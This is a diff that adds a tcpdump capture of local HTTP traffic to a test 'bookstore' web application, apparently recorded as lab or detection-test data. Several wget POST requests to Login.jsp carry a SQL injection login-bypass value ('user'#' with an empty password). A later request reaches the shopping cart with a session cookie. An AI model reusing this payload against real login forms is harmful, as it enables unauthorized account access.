@@ -1,0 +1,56 @@
+23:30:11.536055 IP localhost.37040 > localhost.http-alt: Flags [P.], seq 904712064:904712295, ack 3041323174, win 342, options [nop,nop,TS val 24711725 ecr 24711725], length 231
+E....T@.@.^.............5....F.....V.......
+.y.-.y.-POST /bookstore/Login.jsp HTTP/1.1
+User-Agent: Wget/1.15 (linux-gnu)
+Accept: */*
+Host: 127.0.0.1:8080
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Referer: http://xmodulo.com/
+
+
+23:30:11.538146 IP localhost.37040 > localhost.http-alt: Flags [P.], seq 231:285, ack 1, win 342, options [nop,nop,TS val 24711726 ecr 24711725], length 54
+E..j.U@.@._6............5..g.F.....V.^.....
+.y...y.-FormName=Login&^Cgin=user'#&Password=&FormAction=login
+23:30:34.386349 IP localhost.37048 > localhost.http-alt: Flags [P.], seq 436950419:436950650, ack 1582396515, win 342, options [nop,nop,TS val 24717438 ecr 24717438], length 231
+E...}.@.@.................U.^Qtc...V.......
+.y(~.y(~POST /bookstore/Login.jsp HTTP/1.1
+User-Agent: Wget/1.15 (linux-gnu)
+Accept: */*
+Host: 127.0.0.1:8080
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Referer: http://xmodulo.com/
+
+
+23:30:34.387150 IP localhost.37048 > localhost.http-alt: Flags [P.], seq 231:285, ack 1, win 342, options [nop,nop,TS val 24717438 ecr 24717438], length 54
+E..j}.@.@.................Vz^Qtc...V.^.....
+.y(~.y(~FormName=Login&^Cgin=user'#&Password=&FormAction=login
+23:32:24.289969 IP localhost.37056 > localhost.http-alt: Flags [P.], seq 2224987228:2224987459, ack 3144621191, win 342, options [nop,nop,TS val 24744914 ecr 24744914], length 231
+E.....@.@.,P...............\.o.....V.......
+.y...y..POST /bookstore/Login.jsp HTTP/1.1
+User-Agent: Wget/1.15 (linux-gnu)
+Accept: */*
+Host: 127.0.0.1:8080
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Referer: http://xmodulo.com/
+
+
+23:32:24.290618 IP localhost.37056 > localhost.http-alt: Flags [P.], seq 231:285, ack 1, win 342, options [nop,nop,TS val 24744914 ecr 24744914], length 54
+E..j..@.@.-................C.o.....V.^.....
+.y...y..FormName=Login&Login=user'#&Password=&FormAction=login
+23:32:24.295356 IP localhost.37056 > localhost.http-alt: Flags [P.], seq 285:506, ack 252, win 350, options [nop,nop,TS val 24744915 ecr 24744915], length 221
+E.....@.@.,W...............y.o.....^.......
+.y...y..GET /bookstore/ShoppingCart.jsp HTTP/1.1
+User-Agent: Wget/1.15 (linux-gnu)
+Accept: */*
+Host: 127.0.0.1:8080
+Connection: Keep-Alive
+Cookie: JSESSIONID=E68A09818A88763A1508BB32029F8ABE
+Referer: http://xmodulo.com/
+
+
